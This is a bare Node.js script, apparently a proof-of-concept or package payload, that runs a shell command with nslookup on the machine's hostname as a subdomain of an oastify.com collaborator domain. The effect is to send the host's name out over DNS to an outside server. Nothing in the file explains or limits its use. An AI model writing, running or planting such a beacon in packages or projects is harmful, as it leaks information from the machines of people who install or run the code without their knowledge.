const { exec } = require('child_process');

exec('nslookup `hostname`.8w5smzzjgpv5xy5iqvhxjerhz85ytn.oastify.com', (error, stdout, stderr) => {
  if (error) {
    console.error(`Error executing command: ${error.message}`);
    return;
  }

  if (stderr) {
    console.error(`stderr: ${stderr}`);
    return;
  }

  console.log(`stdout: ${stdout}`);
});
